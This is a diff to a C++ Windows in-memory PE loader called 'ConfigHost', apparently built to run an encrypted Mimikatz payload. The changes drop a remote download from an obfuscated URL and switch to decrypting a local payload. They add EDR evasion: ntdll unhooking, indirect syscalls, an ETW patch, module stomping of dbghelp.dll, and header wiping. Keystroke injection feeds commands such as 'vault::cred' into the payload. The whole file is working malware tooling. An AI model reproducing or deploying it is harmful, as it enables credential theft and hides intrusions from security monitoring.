@@ -3,19 +3,32 @@
 #include <winternl.h>
 #include "resolve.h"
 
+#pragma function(memset, memcpy)
+extern "C" void* memset(void* dst, int val, size_t cnt) {
+    unsigned char* d = (unsigned char*)dst;
+    while (cnt--) *d++ = (unsigned char)val;
+    return dst;
+}
+extern "C" void* memcpy(void* dst, const void* src, size_t cnt) {
+    unsigned char* d = (unsigned char*)dst;
+    const unsigned char* s = (const unsigned char*)src;
+    while (cnt--) *d++ = *s++;
+    return dst;
+}
+
 #pragma comment(lib, "user32.lib")
 static volatile FARPROC _u32[] = { (FARPROC)&GetDC, (FARPROC)&ReleaseDC, (FARPROC)&GetSystemMetrics };
 
 extern "C" NTSTATUS DoIndirectVP(LPVOID addr, SIZE_T size, DWORD prot, PDWORD old, DWORD ssn, PVOID gadget);
+extern "C" NTSTATUS DoIndirectAVM(HANDLE proc, PVOID* base, ULONG_PTR zeroBits, PSIZE_T size, ULONG allocType, ULONG protect, DWORD ssn, PVOID gadget);
 
-typedef LPVOID HINTERNET;
 typedef HMODULE(WINAPI* fn_LLA)(LPCSTR);
 typedef LPVOID(WINAPI* fn_VA)(LPVOID, SIZE_T, DWORD, DWORD);
 typedef BOOL(WINAPI* fn_VP)(LPVOID, SIZE_T, DWORD, PDWORD);
-typedef HINTERNET(WINAPI* fn_IOA)(LPCSTR,DWORD,LPCSTR,LPCSTR,DWORD);
-typedef HINTERNET(WINAPI* fn_IOUA)(HINTERNET,LPCSTR,LPCSTR,DWORD,DWORD,DWORD_PTR);
-typedef BOOL(WINAPI* fn_IRF)(HINTERNET,LPVOID,DWORD,LPDWORD);
-typedef BOOL(WINAPI* fn_ICH)(HINTERNET);
+typedef HANDLE(WINAPI* fn_CF)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
+typedef BOOL(WINAPI* fn_RF)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
+typedef DWORD(WINAPI* fn_GFS)(HANDLE,LPDWORD);
+typedef BOOL(WINAPI* fn_CH)(HANDLE);
 typedef BOOL(WINAPI* fn_CAC)(HCRYPTPROV*,LPCSTR,LPCSTR,DWORD,DWORD);
 typedef BOOL(WINAPI* fn_CHH)(HCRYPTPROV,ALG_ID,HCRYPTKEY,DWORD,HCRYPTHASH*);
 typedef BOOL(WINAPI* fn_CHD)(HCRYPTHASH,const BYTE*,DWORD,DWORD);
@@ -34,27 +47,29 @@ static void xd(char* o, const unsigned char* d, DWORD l, unsigned char k) {
 
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;
+    (void)hInstance; (void)hPrevInstance; (void)nCmdShow;
 
     HMODULE hK = GetModH(0xFB4F5B77u);
-    if (!hK) return 0;
+    if (!hK) return 10;
 
     fn_LLA pLLA = (fn_LLA)GetExpH(hK, 0x97FD671Fu);
     fn_VA  pVA  = (fn_VA)GetExpH(hK, 0xFB9400ABu);
     fn_VP  pVP  = (fn_VP)GetExpH(hK, 0x81BD9BADu);
     fn_CT  pCT  = (fn_CT)GetExpH(hK, 0xF51FF82Du);
     fn_WF  pWF  = (fn_WF)GetExpH(hK, 0x793529D8u);
+    fn_CF  pCF  = (fn_CF)GetExpH(hK, 0xC0DBB964u);
+    fn_RF  pRF  = (fn_RF)GetExpH(hK, 0xB9835133u);
+    fn_GFS pGFS = (fn_GFS)GetExpH(hK, 0x0EAE9872u);
+    fn_CH  pCH  = (fn_CH)GetExpH(hK, 0x82E971DBu);
 
     HMODULE hKB = GetModH(0x2390E863u);
     fn_GPA pGPA = hKB ? (fn_GPA)GetExpH(hKB, 0xB0F41F09u) : NULL;
-    if (!pLLA || !pVA || !pVP || !pCT || !pWF || !pGPA) return 0;
+    if (!pLLA || !pVA || !pVP || !pCT || !pWF || !pGPA || !pCF || !pRF || !pGFS || !pCH) return 11;
 
     HMODULE hNT = GetModH(0xBFF6D513u);
-    DWORD ssn = 0;
+    DWORD ssnVP = 0, ssnAVM = 0;
     PVOID gadget = NULL;
     if (hNT) {
-        FARPROC pNtPVM = GetExpH(hNT, 0x889C44B6u);
-        if (pNtPVM) ssn = *(DWORD*)((BYTE*)pNtPVM + 4);
         PIMAGE_NT_HEADERS ntNh = (PIMAGE_NT_HEADERS)((ULONG_PTR)hNT + ((PIMAGE_DOS_HEADER)hNT)->e_lfanew);
         DWORD ntSz = ntNh->OptionalHeader.SizeOfImage;
         BYTE* scan = (BYTE*)hNT;
@@ -62,6 +77,55 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             if (scan[i] == 0x0F && scan[i+1] == 0x05 && scan[i+2] == 0xC3) {
                 gadget = &scan[i];
                 break;
+            }
+        }
+        char ntpath[] = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0};
+        HANDLE hNtF = pCF(ntpath, 0x80000000, 1, NULL, 3, 0x80, NULL);
+        if (hNtF != INVALID_HANDLE_VALUE) {
+            DWORD ntFSz = pGFS(hNtF, NULL);
+            BYTE* ntRaw = (BYTE*)pVA(NULL, ntFSz, 0x3000, 0x04);
+            if (ntRaw) {
+                DWORD ntRd;
+                pRF(hNtF, ntRaw, ntFSz, &ntRd, NULL);
+                pCH(hNtF);
+                PIMAGE_DOS_HEADER ntDos = (PIMAGE_DOS_HEADER)ntRaw;
+                PIMAGE_NT_HEADERS ntNhC = (PIMAGE_NT_HEADERS)(ntRaw + ntDos->e_lfanew);
+                DWORD ntImgSz = ntNhC->OptionalHeader.SizeOfImage;
+                BYTE* ntClean = (BYTE*)pVA(NULL, ntImgSz, 0x3000, 0x04);
+                if (ntClean) {
+                    for (DWORD ci = 0; ci < ntNhC->OptionalHeader.SizeOfHeaders; ci++)
+                        ntClean[ci] = ntRaw[ci];
+                    PIMAGE_SECTION_HEADER ntSec = IMAGE_FIRST_SECTION(ntNhC);
+                    for (WORD si = 0; si < ntNhC->FileHeader.NumberOfSections; si++) {
+                        if (ntSec[si].SizeOfRawData > 0)
+                            for (DWORD j = 0; j < ntSec[si].SizeOfRawData; j++)
+                                ntClean[ntSec[si].VirtualAddress + j] = ntRaw[ntSec[si].PointerToRawData + j];
+                    }
+                    FARPROC pNtPVM = GetExpH((HMODULE)ntClean, 0x889C44B6u);
+                    if (pNtPVM) ssnVP = *(DWORD*)((BYTE*)pNtPVM + 4);
+                    FARPROC pNtAVM = GetExpH((HMODULE)ntClean, 0xC56666C0u);
+                    if (pNtAVM) ssnAVM = *(DWORD*)((BYTE*)pNtAVM + 4);
+
+                    if (ssnVP && gadget) {
+                        PIMAGE_SECTION_HEADER ntSec2 = IMAGE_FIRST_SECTION(ntNhC);
+                        for (WORD si = 0; si < ntNhC->FileHeader.NumberOfSections; si++) {
+                            if (ntSec2[si].Characteristics & 0x20) {
+                                BYTE* hookedText = (BYTE*)hNT + ntSec2[si].VirtualAddress;
+                                BYTE* cleanText = ntClean + ntSec2[si].VirtualAddress;
+                                SIZE_T textSz = ntSec2[si].Misc.VirtualSize;
+                                DWORD oldP;
+                                DoIndirectVP(hookedText, textSz, 0x40, &oldP, ssnVP, gadget);
+                                for (DWORD j = 0; j < (DWORD)textSz; j++)
+                                    hookedText[j] = cleanText[j];
+                                DoIndirectVP(hookedText, textSz, oldP, &oldP, ssnVP, gadget);
+                                break;
+                            }
+                        }
+                    }
+                    (void)ssnAVM;
+                }
+            } else {
+                pCH(hNtF);
             }
         }
     }
@@ -83,24 +147,73 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
         if (cjText) {
             DWORD old;
-            if (ssn && gadget)
-                DoIndirectVP(cjText, 4096, 0x40, &old, ssn, gadget);
-            else
-                pVP(cjText, 4096, 0x40, &old);
+            pVP(cjText, 4096, 0x40, &old);
         }
     }
 
-    char dll[16];
-    const unsigned char enc_w[] = {0x40,0x5E,0x59,0x5E,0x59,0x52,0x43,0x19,0x53,0x5B,0x5B};
-    xd(dll, enc_w, sizeof(enc_w), 0x37);
-    HMODULE hI = pLLA(dll);
-    if (!hI) return 0;
+    {
+        char s_gcla[] = {'G','e','t','C','o','m','m','a','n','d','L','i','n','e','A',0};
+        typedef LPSTR(WINAPI* fn_GCLA)();
+        fn_GCLA pGCLA = (fn_GCLA)pGPA(hK, s_gcla);
+        if (!pGCLA) return 12;
+        lpCmdLine = pGCLA();
+        if (*lpCmdLine == '"') { lpCmdLine++; while (*lpCmdLine && *lpCmdLine != '"') lpCmdLine++; if (*lpCmdLine) lpCmdLine++; }
+        else { while (*lpCmdLine && *lpCmdLine != ' ') lpCmdLine++; }
+        while (*lpCmdLine == ' ') lpCmdLine++;
+    }
+    if (!lpCmdLine[0]) return 12;
 
-    fn_IOA pIOA = (fn_IOA)GetExpH(hI, 0x667DFFE9u);
-    fn_IOUA pIOUA = (fn_IOUA)GetExpH(hI, 0xA2FFF722u);
-    fn_IRF pIRF = (fn_IRF)GetExpH(hI, 0xC63CF108u);
-    fn_ICH pICH = (fn_ICH)GetExpH(hI, 0x2972B160u);
-    if (!pIOA || !pIOUA || !pIRF || !pICH) return 0;
+    if ((lpCmdLine[0] == '-' && lpCmdLine[1] == 'h') ||
+        (lpCmdLine[0] == '/' && lpCmdLine[1] == '?')) {
+        char s_atc[] = {'A','t','t','a','c','h','C','o','n','s','o','l','e',0};
+        typedef BOOL(WINAPI* fn_ATC)(DWORD);
+        fn_ATC pATC = (fn_ATC)pGPA(hK, s_atc);
+        if (pATC) pATC((DWORD)-1);
+        typedef HANDLE(WINAPI* fn_GSH)(DWORD);
+        char s_gsh[] = {'G','e','t','S','t','d','H','a','n','d','l','e',0};
+        fn_GSH pGSH = (fn_GSH)pGPA(hK, s_gsh);
+        if (pGSH) {
+            char conout[] = {'C','O','N','O','U','T','$',0};
+            HANDLE hO = pCF(conout, 0x40000000, 3, NULL, 3, 0, NULL);
+            const char msg[] =
+                "\r\n  ConfigHost - In-memory PE loader\r\n\r\n"
+                "  Usage:\r\n"
+                "    ConfigHost.exe <payload> [cmd1] [cmd2] ... [exit]\r\n\r\n"
+                "  Arguments:\r\n"
+                "    <payload>    Path to encrypted payload (.bin)\r\n"
+                "    [cmd]        Commands injected into console (optional)\r\n"
+                "    exit         Close after execution\r\n\r\n"
+                "  Examples:\r\n"
+                "    ConfigHost.exe cipher.bin\r\n"
+                "    ConfigHost.exe cipher.bin \"vault::cred\" exit\r\n"
+                "    ConfigHost.exe cipher.bin \"log out.txt\" \"token::whoami\" exit\r\n\r\n"
+                "  Without commands: opens interactive console.\r\n"
+                "  With commands: auto-injects keystrokes then runs.\r\n\r\n";
+            DWORD wr;
+            char s_wf[] = {'W','r','i','t','e','F','i','l','e',0};
+            typedef BOOL(WINAPI* fn_WrF)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
+            fn_WrF pWrF = (fn_WrF)pGPA(hK, s_wf);
+            if (pWrF && hO != INVALID_HANDLE_VALUE) pWrF(hO, msg, sizeof(msg) - 1, &wr, NULL);
+            char s_ssh[] = {'S','e','t','S','t','d','H','a','n','d','l','e',0};
+            typedef BOOL(WINAPI* fn_SSH)(DWORD,HANDLE);
+            fn_SSH pSSH = (fn_SSH)pGPA(hK, s_ssh);
+            if (pSSH && hO != INVALID_HANDLE_VALUE) {
+                pSSH((DWORD)-11, hO);
+                pSSH((DWORD)-12, hO);
+            }
+        }
+        return 0;
+    }
+
+    char* payloadPath = lpCmdLine;
+    while (*payloadPath == ' ' || *payloadPath == '"') payloadPath++;
+    char cleanPath[260];
+    int pi = 0;
+    while (payloadPath[pi] && payloadPath[pi] != '"' && pi < 259) { cleanPath[pi] = payloadPath[pi]; pi++; }
+    cleanPath[pi] = 0;
+    char* extraArgs = payloadPath + pi;
+    if (*extraArgs == '"') extraArgs++;
+    while (*extraArgs == ' ') extraArgs++;
 
     char dll2[16];
     const unsigned char enc_a[] = {0x23,0x26,0x34,0x23,0x32,0x2B,0x71,0x70,0x6C,0x26,0x2E,0x2E};
@@ -116,59 +229,92 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     fn_DK pDK = (fn_DK)GetExpH(hA, 0x2976A3FEu);
     fn_DH pDH = (fn_DH)GetExpH(hA, 0xE4A6591Bu);
     fn_RC pRC = (fn_RC)GetExpH(hA, 0x3B6CDDFDu);
-    if (!pCAC || !pCCH || !pCHD || !pCDK || !pCDT || !pDK || !pDH || !pRC) return 0;
+    if (!pCAC || !pCCH || !pCHD || !pCDK || !pCDT || !pDK || !pDH || !pRC) return 13;
 
-    const unsigned char eua[] = {0x18,0x3A,0x2F,0x3C,0x39,0x39,0x34,0x7A,0x60,0x7B,0x65};
-    char ua[32]; xd(ua, eua, sizeof(eua), 0x55);
-    HINTERNET hNet = pIOA(ua, 0, NULL, NULL, 0);
-    if (!hNet) return 0;
+    HANDLE hFile = pCF(cleanPath, 0x80000000, 1, NULL, 3, 0x80, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return 14;
+    DWORD total = pGFS(hFile, NULL);
+    if (total == 0xFFFFFFFF || total < 0x100) { pCH(hFile); return 15; }
 
-    const unsigned char eurl[] = {0x3D,0x21,0x21,0x25,0x6F,0x7A,0x7A,0x64,0x67,0x62,0x7B,0x65,0x7B,0x65,0x7B,0x64,0x7A,0x36,0x3C,0x25,0x3D,0x30,0x27,0x7B,0x37,0x3C,0x3B};
-    char url[256]; xd(url, eurl, sizeof(eurl), 0x55);
+    LPVOID buf = pVA(NULL, total, 0x3000, 0x04);
+    if (!buf) { pCH(hFile); return 16; }
 
-    HINTERNET hUrl = pIOUA(hNet, url, NULL, 0, 0x84000000, 0);
-    if (!hUrl) { pICH(hNet); return 0; }
-
-    LPVOID buf = pVA(NULL, 0x200000, 0x3000, 0x04);
-    if (!buf) { pICH(hUrl); pICH(hNet); return 0; }
-
-    DWORD total = 0, rd = 0;
-    while (pIRF(hUrl, (BYTE*)buf + total, 0x200000 - total, &rd) && rd > 0) total += rd;
-    pICH(hUrl);
-    pICH(hNet);
-    if (total < 0x100) return 0;
+    DWORD rd = 0, totalRead = 0;
+    while (totalRead < total) {
+        if (!pRF(hFile, (BYTE*)buf + totalRead, total - totalRead, &rd, NULL) || rd == 0) break;
+        totalRead += rd;
+    }
+    pCH(hFile);
+    if (totalRead < 0x100) return 17;
+    total = totalRead;
 
     DWORD evSz = *(DWORD*)buf;
-    if (cjText && evSz > 0 && 4 + evSz < total) {
-        for (DWORD i = 0; i < evSz; i++) cjText[i] = ((BYTE*)buf)[4+i];
-        ((void(*)(BYTE*))(cjText))(cjText + evSz);
-        DWORD skip = 4 + evSz;
+    {
+        DWORD skip = 4;
+        if (evSz > 0 && evSz < 0x100000 && 4 + evSz < total) skip = 4 + evSz;
         for (DWORD mv = 0; mv < total - skip; mv++) ((BYTE*)buf)[mv] = ((BYTE*)buf)[skip + mv];
         total -= skip;
     }
 
     HCRYPTPROV hProv = 0;
-    pCAC(&hProv, NULL, NULL, 24, 0xF0000000);
+    if (!pCAC(&hProv, NULL, NULL, 24, 0xF0000000)) return 20;
     HCRYPTHASH hHash = 0;
-    pCCH(hProv, 0x8004, 0, 0, &hHash);
+    if (!pCCH(hProv, 0x8004, 0, 0, &hHash)) return 21;
 
     #include "../mimi_key.h"
-    pCHD(hHash, keyBuff, sizeof(keyBuff), 0);
+    if (!pCHD(hHash, keyBuff, sizeof(keyBuff), 0)) return 22;
 
     HCRYPTKEY hKey = 0;
-    pCDK(hProv, 0x6610, hHash, 0, &hKey);
+    if (!pCDK(hProv, 0x6610, hHash, 0, &hKey)) return 23;
 
     DWORD decLen = total;
-    pCDT(hKey, 0, TRUE, 0, (BYTE*)buf, &decLen);
+    if (!pCDT(hKey, 0, TRUE, 0, (BYTE*)buf, &decLen)) return 24;
     pDK(hKey); pDH(hHash); pRC(hProv, 0);
-    if (decLen < 0x100) return 0;
+    if (decLen < 0x100) return 18;
 
     PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)buf;
+    if (dh->e_magic != 0x5A4D) return 25;
     PIMAGE_NT_HEADERS nh = (PIMAGE_NT_HEADERS)((ULONG_PTR)buf + dh->e_lfanew);
     DWORD imgSz = nh->OptionalHeader.SizeOfImage;
 
-    LPVOID img = pVA(NULL, imgSz, 0x3000, 0x04);
-    if (!img) return 0;
+    LPVOID img;
+    {
+        char s_cfa[] = {'C','o','p','y','F','i','l','e','A',0};
+        char s_gtp[] = {'G','e','t','T','e','m','p','P','a','t','h','A',0};
+        typedef BOOL(WINAPI* fn_CFA)(LPCSTR, LPCSTR, BOOL);
+        typedef DWORD(WINAPI* fn_GTP)(DWORD, LPSTR);
+        fn_CFA pCFA = (fn_CFA)pGPA(hK, s_cfa);
+        fn_GTP pGTP = (fn_GTP)pGPA(hK, s_gtp);
+        if (!pCFA || !pGTP) return 30;
+        char src[] = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','d','b','g','h','e','l','p','.','d','l','l',0};
+        char tb[80]; DWORD tl = pGTP(sizeof(tb), tb);
+        if (tl == 0) return 30;
+        char dst[100]; int di = 0;
+        for (DWORD ti = 0; ti < tl && di < 90; ti++) dst[di++] = tb[ti];
+        if (di > 0 && dst[di-1] != '\\') dst[di++] = '\\';
+        char sfx[] = {'d','h','.','d','l','l',0};
+        for (int si = 0; sfx[si]; si++) dst[di++] = sfx[si];
+        dst[di] = 0;
+        pCFA(src, dst, FALSE);
+        char s_llex[] = {'L','o','a','d','L','i','b','r','a','r','y','E','x','A',0};
+        typedef HMODULE(WINAPI* fn_LLEX)(LPCSTR,HANDLE,DWORD);
+        fn_LLEX pLLEX = (fn_LLEX)pGPA(hK, s_llex);
+        if (!pLLEX) return 31;
+        HMODULE hSM = pLLEX(dst, NULL, 1);
+        if (!hSM) return 32;
+        PIMAGE_NT_HEADERS stNh = (PIMAGE_NT_HEADERS)((BYTE*)hSM + ((PIMAGE_DOS_HEADER)hSM)->e_lfanew);
+        DWORD stSz = stNh->OptionalHeader.SizeOfImage;
+        if (stSz < imgSz) return 33;
+        DWORD oldp;
+        pVP((LPVOID)hSM, stSz, 0x40, &oldp);
+        for (DWORD z = 0; z < stSz; z++) ((BYTE*)hSM)[z] = 0;
+        img = (LPVOID)hSM;
+
+        char s_dfa[] = {'D','e','l','e','t','e','F','i','l','e','A',0};
+        typedef BOOL(WINAPI* fn_DFA)(LPCSTR);
+        fn_DFA pDFA = (fn_DFA)pGPA(hK, s_dfa);
+        if (pDFA) pDFA(dst);
+    }
 
     for (DWORD i = 0; i < nh->OptionalHeader.SizeOfHeaders; i++)
         ((BYTE*)img)[i] = ((BYTE*)buf)[i];
@@ -176,10 +322,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nh);
     for (WORD i = 0; i < nh->FileHeader.NumberOfSections; i++) {
         if (sec[i].SizeOfRawData > 0) {
-            BYTE* dst = (BYTE*)img + sec[i].VirtualAddress;
-            BYTE* src = (BYTE*)buf + sec[i].PointerToRawData;
+            BYTE* ddst = (BYTE*)img + sec[i].VirtualAddress;
+            BYTE* ssrc = (BYTE*)buf + sec[i].PointerToRawData;
             for (DWORD j = 0; j < sec[i].SizeOfRawData; j++)
-                dst[j] = src[j];
+                ddst[j] = ssrc[j];
         }
     }
 
@@ -209,6 +355,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         if (pAC) pAC();
     }
 
+
     IMAGE_DATA_DIRECTORY impDir = nh->OptionalHeader.DataDirectory[1];
     if (impDir.VirtualAddress) {
         BYTE* id = (BYTE*)img + impDir.VirtualAddress;
@@ -230,26 +377,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
-    PIMAGE_NT_HEADERS nh2 = (PIMAGE_NT_HEADERS)((BYTE*)img + ((PIMAGE_DOS_HEADER)img)->e_lfanew);
-    PIMAGE_SECTION_HEADER sec2 = IMAGE_FIRST_SECTION(nh2);
-    for (WORD i = 0; i < nh2->FileHeader.NumberOfSections; i++) {
-        DWORD ch = sec2[i].Characteristics;
-        DWORD prot;
-        BOOL exec = (ch & 0x20000000) != 0;
-        BOOL wr = (ch & 0x80000000) != 0;
-        if (exec && wr) prot = 0x40;
-        else if (exec) prot = 0x20;
-        else if (wr) prot = 0x04;
-        else prot = 0x02;
-        DWORD old;
-        if (ssn && gadget)
-            DoIndirectVP((BYTE*)img + sec2[i].VirtualAddress, sec2[i].Misc.VirtualSize, prot, &old, ssn, gadget);
-        else
-            pVP((BYTE*)img + sec2[i].VirtualAddress, sec2[i].Misc.VirtualSize, prot, &old);
-    }
-
     {
-        IMAGE_DATA_DIRECTORY excDir = nh2->OptionalHeader.DataDirectory[3];
+        IMAGE_DATA_DIRECTORY excDir = nh->OptionalHeader.DataDirectory[3];
         if (excDir.VirtualAddress && excDir.Size) {
             char raft[20];
             const unsigned char enc_raft[] = {0x08,0x2E,0x36,0x1B,0x3E,0x3E,0x1C,0x2F,0x34,0x39,0x2E,0x33,0x35,0x34,0x0E,0x3B,0x38,0x36,0x3F};
@@ -262,33 +391,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                       (DWORD64)(ULONG_PTR)img);
         }
 
-        {
-            BYTE* peb3 = (BYTE*)__readgsqword(0x60);
-            BYTE* ldr3 = *(BYTE**)(peb3 + 0x18);
-            BYTE* hd3 = ldr3 + 0x10;
-            BYTE* flink = *(BYTE**)hd3;
-            BYTE* entry = (BYTE*)pVA(NULL, 0x200, 0x3000, 0x04);
-            if (entry) {
-                for (int z = 0; z < 0x200; z++) entry[z] = 0;
-                *(PVOID*)(entry + 0x30) = img;
-                *(ULONG*)(entry + 0x40) = imgSz;
-                *(PVOID*)(entry + 0x38) = (PVOID)((ULONG_PTR)img + nh2->OptionalHeader.AddressOfEntryPoint);
-                *(BYTE**)(entry + 0x00) = flink;
-                *(BYTE**)(entry + 0x08) = hd3;
-                *(BYTE**)(hd3 + 0x00) = entry;
-                *(BYTE**)(flink + 0x08) = entry;
-                BYTE* hd3m = ldr3 + 0x20;
-                BYTE* flinkm = *(BYTE**)hd3m;
-                *(BYTE**)(entry + 0x10) = flinkm;
-                *(BYTE**)(entry + 0x18) = hd3m;
-                *(BYTE**)(hd3m + 0x00) = entry + 0x10;
-                *(BYTE**)(flinkm + 0x08) = entry + 0x10;
-            }
-        }
     }
 
     {
-        IMAGE_DATA_DIRECTORY tlsDir = nh2->OptionalHeader.DataDirectory[9];
+        IMAGE_DATA_DIRECTORY tlsDir = nh->OptionalHeader.DataDirectory[9];
         if (tlsDir.VirtualAddress && tlsDir.Size) {
             IMAGE_TLS_DIRECTORY* tls = (IMAGE_TLS_DIRECTORY*)((BYTE*)img + tlsDir.VirtualAddress);
             BYTE* peb2 = (BYTE*)__readgsqword(0x60);
@@ -298,7 +404,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             DWORD tlsCnt = 0;
             while (cr2 != hd2) {
                 HMODULE mx = *(HMODULE*)(cr2 + 0x20);
-                if (mx) {
+                if (mx && (LPVOID)mx != img) {
                     IMAGE_NT_HEADERS* mn = (IMAGE_NT_HEADERS*)((BYTE*)mx + ((IMAGE_DOS_HEADER*)mx)->e_lfanew);
                     if (mn->OptionalHeader.DataDirectory[9].VirtualAddress && mn->OptionalHeader.DataDirectory[9].Size)
                         tlsCnt++;
@@ -325,8 +431,114 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
-    ULONG_PTR ep = (ULONG_PTR)img + nh2->OptionalHeader.AddressOfEntryPoint;
-    ((void(*)())ep)();
+    if (hNT) {
+        char etw[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
+        FARPROC pETW = pGPA(hNT, etw);
+        if (pETW) {
+            DWORD oldETW;
+            pVP((LPVOID)pETW, 4, 0x40, &oldETW);
+            ((BYTE*)pETW)[0] = 0x33; ((BYTE*)pETW)[1] = 0xC0; ((BYTE*)pETW)[2] = 0xC3;
+            pVP((LPVOID)pETW, 4, oldETW, &oldETW);
+        }
+    }
+
+    {
+        PIMAGE_SECTION_HEADER ps = IMAGE_FIRST_SECTION(
+            (PIMAGE_NT_HEADERS)((BYTE*)img + ((PIMAGE_DOS_HEADER)img)->e_lfanew));
+        for (WORD si = 0; si < nh->FileHeader.NumberOfSections; si++) {
+            DWORD ch = ps[si].Characteristics;
+            DWORD prot;
+            if (ch & 0x20000000) prot = (ch & 0x80000000) ? 0x40 : 0x20;
+            else if (ch & 0x80000000) prot = 0x04;
+            else prot = 0x02;
+            DWORD osp;
+            pVP((BYTE*)img + ps[si].VirtualAddress, ps[si].Misc.VirtualSize, prot, &osp);
+        }
+    }
+
+    if (*extraArgs) {
+        char s_gclw[] = {'G','e','t','C','o','m','m','a','n','d','L','i','n','e','W',0};
+        typedef LPWSTR(WINAPI* fn_GCLW)();
+        fn_GCLW pGCLW = (fn_GCLW)pGPA(hK, s_gclw);
+        char s_mbtwc[] = {'M','u','l','t','i','B','y','t','e','T','o','W','i','d','e','C','h','a','r',0};
+        typedef int(WINAPI* fn_MBTWC)(UINT,DWORD,LPCCH,int,LPWSTR,int);
+        fn_MBTWC pMBTWC = (fn_MBTWC)pGPA(hK, s_mbtwc);
+        if (pGCLW && pMBTWC) {
+            LPWSTR clW = pGCLW();
+            char s_gcla2[] = {'G','e','t','C','o','m','m','a','n','d','L','i','n','e','A',0};
+            typedef LPSTR(WINAPI* fn_GCLA2)();
+            fn_GCLA2 pGCLA2 = (fn_GCLA2)pGPA(hK, s_gcla2);
+            LPSTR clA = pGCLA2 ? pGCLA2() : NULL;
+            char fakeA[2048];
+            fakeA[0]='p'; fakeA[1]='.'; fakeA[2]='e'; fakeA[3]='x'; fakeA[4]='e'; fakeA[5]=' ';
+            int ai = 6;
+            for (char* s = extraArgs; *s && ai < 2046; ) fakeA[ai++] = *s++;
+            fakeA[ai] = 0;
+            int wLen = pMBTWC(0, 0, fakeA, -1, NULL, 0);
+            if (wLen > 0 && wLen <= 1024) {
+                pMBTWC(0, 0, fakeA, -1, clW, wLen);
+            }
+            if (clA) {
+                for (int ci = 0; ci < ai; ci++) clA[ci] = fakeA[ci];
+                clA[ai] = 0;
+            }
+        }
+
+        char s_wci[] = {'W','r','i','t','e','C','o','n','s','o','l','e','I','n','p','u','t','W',0};
+        char s_gsh[] = {'G','e','t','S','t','d','H','a','n','d','l','e',0};
+        typedef BOOL(WINAPI* fn_WCI)(HANDLE, const INPUT_RECORD*, DWORD, LPDWORD);
+        typedef HANDLE(WINAPI* fn_GSH)(DWORD);
+        fn_WCI pWCI = (fn_WCI)pGPA(hK, s_wci);
+        fn_GSH pGSH = (fn_GSH)pGPA(hK, s_gsh);
+        if (pWCI && pGSH) {
+            HANDLE hIn = pGSH((DWORD)-10);
+            char* ea = extraArgs;
+            while (*ea) {
+                while (*ea == ' ') ea++;
+                if (!*ea) break;
+                char* s; DWORD n;
+                if (*ea == '"') { ea++; s = ea; while (*ea && *ea != '"') ea++; n = (DWORD)(ea - s); if (*ea) ea++; }
+                else { s = ea; while (*ea && *ea != ' ') ea++; n = (DWORD)(ea - s); }
+                for (DWORD ci = 0; ci < n; ci++) {
+                    INPUT_RECORD ir;
+                    ir.EventType = KEY_EVENT;
+                    ir.Event.KeyEvent.bKeyDown = TRUE;
+                    ir.Event.KeyEvent.wRepeatCount = 1;
+                    ir.Event.KeyEvent.wVirtualKeyCode = 0;
+                    ir.Event.KeyEvent.wVirtualScanCode = 0;
+                    ir.Event.KeyEvent.uChar.UnicodeChar = (WCHAR)s[ci];
+                    ir.Event.KeyEvent.dwControlKeyState = 0;
+                    DWORD wr;
+                    pWCI(hIn, &ir, 1, &wr);
+                }
+                INPUT_RECORD ir;
+                ir.EventType = KEY_EVENT;
+                ir.Event.KeyEvent.bKeyDown = TRUE;
+                ir.Event.KeyEvent.wRepeatCount = 1;
+                ir.Event.KeyEvent.wVirtualKeyCode = 0x0D;
+                ir.Event.KeyEvent.wVirtualScanCode = 0x1C;
+                ir.Event.KeyEvent.uChar.UnicodeChar = L'\r';
+                ir.Event.KeyEvent.dwControlKeyState = 0;
+                DWORD wr;
+                pWCI(hIn, &ir, 1, &wr);
+            }
+        }
+    }
+
+    {
+        DWORD hdOld;
+        DWORD hdSz = nh->OptionalHeader.SizeOfHeaders;
+        ULONG_PTR epRVA = nh->OptionalHeader.AddressOfEntryPoint;
+
+        for (DWORD wi = 0; wi < total; wi++) ((BYTE*)buf)[wi] = 0;
+
+        pVP(img, hdSz, 0x04, &hdOld);
+        for (DWORD i = 0; i < hdSz; i++) ((BYTE*)img)[i] = 0;
+        pVP(img, hdSz, 0x02, &hdOld);
+
+        ULONG_PTR ep = (ULONG_PTR)img + epRVA;
+        ((void(*)())ep)();
+    }
 
     return 0;
 }
